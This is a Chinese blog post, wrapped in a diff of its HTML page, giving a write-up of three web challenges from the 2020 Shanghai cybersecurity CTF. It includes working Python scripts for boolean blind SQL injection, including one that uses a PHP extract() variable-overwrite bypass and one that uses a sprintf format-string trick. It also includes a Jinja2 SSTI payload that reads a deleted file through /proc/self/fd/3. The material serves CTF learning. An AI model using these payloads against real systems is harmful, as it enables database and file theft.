@@ -1,0 +1,220 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2020上海市网络安全大赛 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="注入杯，感觉也是自闭的一天orz,垃圾文章，只不过是记录一下脚本
+千毒网盘
+1https:&amp;#x2F;&amp;#x2F;blog.csdn.net&amp;#x2F;weixin_30258901&amp;#x2F;ar,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2020上海市网络安全大赛</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2020上海市网络安全大赛</h1>
+        <div class="stuff">
+            <span>十一月 14, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>注入杯，感觉也是自闭的一天orz,垃圾文章，只不过是记录一下脚本</p>
+<h1 id="千毒网盘"><a href="#千毒网盘" class="headerlink" title="千毒网盘"></a>千毒网盘</h1><p><img src="2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/QGuEzupA6iniGX9V.png!thumbnail" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162</span><br></pre></td></tr></table></figure>
+
+<p>在这个🔗下我们可以找到的！利用比较简单，如果我们需要的参数在get上，可以构造如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code = xx</span><br><span class="line">_GET[code] =xx</span><br><span class="line">只需要两者保持一致即可</span><br></pre></td></tr></table></figure>
+
+<p>如果在POST上，则反过来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_POST[code] =xx</span><br><span class="line">code =xx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于$$key_2 == $value_2使得POST的值被unset了，绕过waf，后面再次extract造成变量覆盖 然后是布尔盲注，这里用–+代替#，不然会出现错误情况</p>
+<p>队里师傅的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    l=<span class="number">28</span></span><br><span class="line">    h=<span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(h - l) &gt; <span class="number">1</span>:</span><br><span class="line">        m=(l+h)/<span class="number">2</span></span><br><span class="line">        pay=<span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">        <span class="comment">#pay=&quot;database()&quot;</span></span><br><span class="line">        e = <span class="string">&quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pay, i, m)</span><br><span class="line">        data = <span class="string">&quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;])</span></span><br><span class="line">        re=requests.post(url+<span class="string">&quot;?_POST[code]=&quot;</span>+data.strip(<span class="string">&#x27;code=&#x27;</span>),data=data,headers=headers)</span><br><span class="line">        <span class="comment">#print(re.text)</span></span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#exit()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;http://gamectf.com/p/CGBU.png&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            l=m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h=m</span><br><span class="line">    mid_num = <span class="built_in">int</span>((l + h + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    text += <span class="built_in">chr</span>(<span class="built_in">int</span>(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="TryToLogin"><a href="#TryToLogin" class="headerlink" title="TryToLogin"></a>TryToLogin</h1><p>这道题目是格式化字符串注入，感觉有必要学习一下,sprintf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">proxies&#x3D;&#123;</span><br><span class="line">&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        m&#x3D;(l+h)&#x2F;2</span><br><span class="line">        pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">        pay&#x3D;&quot;select * from fl4g&quot;</span><br><span class="line">        e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m)</span><br><span class="line">        data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39;</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">        if &#39;登录成功了&#39; in re.text:</span><br><span class="line">            l&#x3D;m</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;m</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这道题比较新有意思的点在两个地方：</p>
+<p>过滤了这个地方</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>
+
+<p>过滤了左右花括号,这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果满足条件，则会输出<del>p0</del>，否则就不会输出。第二点，我们该读取什么文件呢？</p>
+<p>这里运用了os.system(“rm -f /flag”)</p>
+<p>默认的进程删除后会存放在暂时文件中，进程为：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>
+
+<p>故编写脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%83%E6%AF%92%E7%BD%91%E7%9B%98"><span class="toc-number">1.</span> <span class="toc-text">千毒网盘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TryToLogin"><span class="toc-number">2.</span> <span class="toc-text">TryToLogin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI"><span class="toc-number">3.</span> <span class="toc-text">SSTI</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
